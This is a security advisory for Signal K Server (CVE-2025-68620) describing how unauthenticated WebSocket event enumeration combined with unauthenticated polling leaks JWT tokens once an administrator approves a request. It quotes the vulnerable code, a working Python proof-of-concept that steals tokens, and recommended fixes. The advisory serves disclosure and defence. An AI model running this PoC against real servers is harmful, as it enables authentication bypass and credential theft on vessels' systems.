# [C] Signal K Server vulnerable to JWT Token Theft via WebSocket Enumeration and Unauthenticated Polling

## Summary
Severity: Critical
Advisory: GHSA-fq56-hvg6-wvm5
CVE: CVE-2025-68620
CWE: CWE-288
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-01-02
Source: https://github.com/advisories/GHSA-fq56-hvg6-wvm5
Type: github-advisory

## Affected
- npm: `signalk-server` — affected >=0 <2.19.0

## Details
SignalK Server exposes two features that can be chained together to steal JWT authentication tokens without any prior authentication. The attack combines WebSocket-based request enumeration with unauthenticated polling of access request status.

**Unauthenticated WebSocket Request Enumeration**: When a WebSocket client connects to the SignalK stream endpoint with the `serverevents=all` query parameter, the server sends all cached server events including `ACCESS_REQUEST` events that contain details about pending access requests. The `startServerEvents` function iterates over `app.lastServerEvents` and writes each cached event to any connected client without verifying authorization level. Since WebSocket connections are allowed for readonly users (which includes unauthenticated users when `allow_readonly` is true), attackers receive these events containing request IDs, client identifiers, descriptions, requested permissions, and IP addresses.

**Unauthenticated Token Polling**: The access request status endpoint at `/signalk/v1/access/requests/:id` returns the full state of an access request without requiring authentication. When an administrator approves a request, the response includes the issued JWT token in plaintext. The `queryRequest` function returns the complete request object including the token field, and the REST endpoint uses readonly authentication, allowing unauthenticated access.

An attacker has two paths to exploit these vulnerabilities:

1. The attacker creates their own access request (using the IP spoofing vulnerability to craft a convincing spoofed request), then polls their own request ID until an administrator approves it, receiving the JWT token.

2. The attacker passively monitors the WebSocket stream to discover request IDs from legitimate devices, then polls those IDs and steals the JWT tokens when administrators approve them, hijacking legitimate device credentials.

Both paths require zero authentication and enable complete authentication bypass.

### Affected Code

**File**: `src/events.ts` (lines 40-43)

```typescript
Object.keys(app.lastServerEvents).forEach((propName) => {
  spark.write(app.lastServerEvents[propName])
})
```

All cached server events, including `ACCESS_REQUEST`, are sent to any connected WebSocket client without permission checks.

**File**: `src/tokensecurity.js` (lines 946-948)

```javascript
strategy.getAccessRequestsResponse = () => {
  return filterRequests('accessRequest', 'PENDING')
}
```

This function returns all pending requests with full details, which is then broadcast as a server event.

**File**: `src/requestResponse.js` (lines 108-135)

```javascript
function createReply(request, state, props) {
  const reply = {
    state: state,
    requestId: request.requestId
  }

  if (request.updateCb) {
    props.forEach((prop) => {
      if (typeof request[prop] !== 'undefined') {
        reply[prop] = request[prop]  // Includes 'token' when approved
      }
    })
  }
  return reply
}
```

When an access request transitions to COMPLETED state with APPROVED permission, the token is included in the reply object.

**File**: `src/interfaces/rest.js` (endpoint registration)

The `/signalk/v1/access/requests/:id` endpoint uses readonly authentication, allowing unauthenticated access when `allow_readonly` is true.

### Impact

An attacker can obtain any JWT token issued by the server without authentication. By exploiting the social engineering vulnerability to request admin permissions, they receive a fully privileged admin token granting access to all protected endpoints including package installation, effectively bypassing authentication entirely. Additionally, attackers can hijack legitimate device credentials by stealing tokens intended for real devices.

### PoC

```python
import json, websocket, requests, time

TARGET_IP, TARGET_PORT = "localhost", 3000
TARGET_WS = f"ws://{TARGET_IP}:{TARGET_PORT}"
TARGET_HTTP = f"http://{TARGET_IP}:{TARGET_PORT}"

def poll_for_token(request_id, href):
    print(f"[*] Polling started for request {request_id}")
    url = f"{TARGET_HTTP}{href}"
    while True:
        try:
            r = requests.get(url)
            
            if r.status_code == 200:
                data = r.json()
                state = data.get("state")
                print(f"[.] Request {request_id} state: {state}")
                
                if state == "COMPLETED":
                    access_req = data.get("accessRequest", {})
                    permission = access_req.get("permission")
                    token = access_req.get("token")
                    
                    print(f"[*] Request completed - Permission: {permission}, Token present: {bool(token)}")
                    
                    if token:
                        print(f"[+] TOKEN STOLEN")
                        print(f"[+] Permission: {permission}")
                        print(f"[+] JWT Token: {token}")
                        return token
                    else:
                        print(f"[-] Request {request_id} denied or no token")
                        return None
            else:
                print(f"[-] HTTP {r.status_code} for request {request_id}")
                        
        except Exception as e:
            print(f"[-] Error polling {request_id}: {e}")
            
        time.sleep(5)

def monitor_and_steal_tokens():
    uri = f"{TARGET_WS}/signalk/v1/stream?serverevents=all"
    print(f"[*] Connecting to {uri}")
    
    ws = websocket.create_connection(uri)
    print("[+] Connected, monitoring for ACCESS_REQUEST events...")
    
    while True:
        message = ws.recv()
        msg = json.loads(message)
        
        if msg.get("type") == "ACCESS_REQUEST":
            print("[+] ACCESS_REQUEST event received!")
            data = msg.get("data", [])
            
            if data:
                req = data[0]
                request_id = req.get('requestId')
                permissions = req.get('clientRequest', {}).get('permissions')
                href = req.get('href', f'/signalk/v1/requests/{request_id}')
                
                print(f"[*] Found request: {request_id}")
                print(f"[*] Closing WebSocket and starting polling...")
                
                ws.close()
                poll_for_token(request_id, href)
                break

if __name__ == "__main__":
    monitor_and_steal_tokens()
```

### Recommendations

1. Require strict authentication for all WebSocket channels. The `serverevents=all` parameter should only be accessible to authenticated admin users. Unauthenticated or readonly users should not receive any server events.
2. Place `ACCESS_REQUEST` events behind strict authentication. Even if other server events are available to readonly users, access request details must only be sent to authenticated administrators.
3. Implement client verification so only the original requester can retrieve their token
4. Consider delivering tokens through a separate secure channel rather than the polling endpoint

## References
- https://github.com/SignalK/signalk-server/security/advisories/GHSA-fq56-hvg6-wvm5
- https://nvd.nist.gov/vuln/detail/CVE-2025-68620
- https://github.com/SignalK/signalk-server/commit/221aff6cd89c56308084d1781b3abbf938605bd3
- https://github.com/SignalK/signalk-server
- https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
